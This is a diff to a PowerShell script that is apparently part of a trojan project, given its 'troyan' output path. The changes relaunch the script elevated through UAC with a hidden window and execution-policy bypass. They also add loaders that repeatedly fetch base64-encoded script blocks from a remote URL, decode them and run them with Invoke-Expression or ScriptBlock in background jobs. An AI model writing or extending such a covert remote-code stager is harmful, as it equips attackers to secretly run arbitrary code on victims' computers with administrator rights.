@@ -32,23 +32,13 @@ function Utf8NoBom {
         [string]$data,
         [string]$file
     )
-
-    # Create a StreamWriter to write without BOM
     $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
     $streamWriter.Write($data)
     $streamWriter.Close()
-
-    # Forcefully overwrite the file to ensure no BOM is present
-    # Read back the written file as byte array
     $writtenContent = [System.IO.File]::ReadAllBytes($file)
-
-    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
     if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
-        # Remove the BOM bytes
         $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
     }
-
-    # Write back the content without BOM
     [System.IO.File]::WriteAllBytes($file, $writtenContent)
 }
 
@@ -139,12 +129,17 @@ function RunMe {
             $localArguments += "-$arg"
         }
 
-        $localArgumentList = @("-File", $scriptPath) + $localArguments
+        $localArgumentList = @("-File", "`"$scriptPath`"") + $localArguments
         
         if ($uac -eq $true) {
-            Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs
+            $arg = "-$arg"
+            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $arg -Verbose" -Verb RunAs -WindowStyle Hidden
+
+            #$cmd="Start-Process Powershell -Verb RunAs -Wait -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -$arg'"
+           # powershell -ExecutionPolicy Bypass -Command $cmd
+         #   Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs -WindowStyle Hidden
         } else {
-            Start-Process powershell.exe -ArgumentList $localArgumentList
+            Start-Process powershell.exe -ArgumentList $localArgumentList -WindowStyle Hidden
         }
     }
     catch {
@@ -212,25 +207,30 @@ function RunRemote {
     param (
         [string]$baseUrl,
         [string]$block,
-        [bool]$isJob = $false,
-        [bool]$isWait = $true
+        [string]$param = $null,
+        [bool]$isWait = $true,
+        [bool]$isJob = $false
     )
+    $cmd = "do_$block"
+    if ($param -ne $null)
+    {
+        $cmd += " -param '$param'"
+    }
     $url = "$baseUrl$block.txt"
     $timeout = [datetime]::UtcNow.AddMinutes(5)
     $delay = 10
-    Start-Sleep -Seconds $delay
     while ([datetime]::UtcNow -lt $timeout) {
         try {
             $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
             if ($response.StatusCode -eq 200) {
                 $scriptData = $response.Content
-                $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData))
+                $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData)) + "`n`n" + $cmd
                 if ($globalDebug)
                 {
                     try {
                         Utf8NoBom -data $scriptData -file "C:\Soft\hephaestus\troyan\_output\_temp_$block.ps1"      
                     }
-                    catch {
+                     catch {
                     }
                 }
                 $codeBlock = [ScriptBlock]::Create($scriptData)
@@ -267,40 +267,75 @@ function RunRemote {
 function RunRemoteAsync {
     param (
         [string]$baseUrl,
-        [string]$block
+        [string]$block,
+        [string]$param = $null
     )
     $url = "$baseUrl/$block.txt"
-
-    # Main async job to fetch and process the script data
+    $cmd = "do_$block"
+    if ($param -ne $null)
+    {
+        $cmd += " -param '$param'"
+    }
     $asyncJob = Start-Job -ScriptBlock {
         param (
-            [string]$url,
-            [string]$cmd
+            [string]$url, [string]$block, [string]$cmd, [bool]$debug
         )
 
-        $timeout = [datetime]::UtcNow.AddMinutes(5)
-        $delay = 5
-        Start-Sleep -Seconds $delay
+        function Utf8NoBom {
+            param (
+                [string]$data,
+                [string]$file
+            )
+            $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
+            $streamWriter.Write($data)
+            $streamWriter.Close()
+            $writtenContent = [System.IO.File]::ReadAllBytes($file)
+            if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
+                $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
+            }
+            [System.IO.File]::WriteAllBytes($file, $writtenContent)
+        }
 
+        $timeout = [datetime]::UtcNow.AddMinutes(5)
+        $delay = 10
         while ([datetime]::UtcNow -lt $timeout) {
             try {
                 $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
                 if ($response.StatusCode -eq 200) {
-                    # Decode the base64 content and append command
                     $scriptData = $response.Content
-                    $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData))
+                    $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData)) + "`n`n" + $cmd
+                    if ($debug)
+                    {
+                        try {
+                            Utf8NoBom -data $scriptData -file "C:\Soft\hephaestus\troyan\_output\_temp_$block.ps1"      
+                        }
+                         catch {
+                        }
+                    }
                     Invoke-Expression -Command $scriptData
                     return
                 }
             } catch {
-                # Optional error handling or logging
+                Write-Output $_
             } 
             Start-Sleep -Seconds $delay
         }
-    } -ArgumentList $url, $cmd
+    } -ArgumentList $url, $block, $cmd, $globalDebug
+    return $asyncJob
+}
 
-    # Optional return of the async job, if needed for monitoring
-    #Wait-Job -Job $asyncJob -Timeout 300 | Out-Null
-    #Remove-Job -Job $asyncJob
-    #return $asyncJob
+function Convert-StringToBase64 {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$InputString
+    )
+    
+    # Convert the string to bytes
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
+    
+    # Encode the bytes to a Base64 string
+    $base64String = [Convert]::ToBase64String($bytes)
+    
+    # Return the Base64-encoded string
+    return $base64String
 }
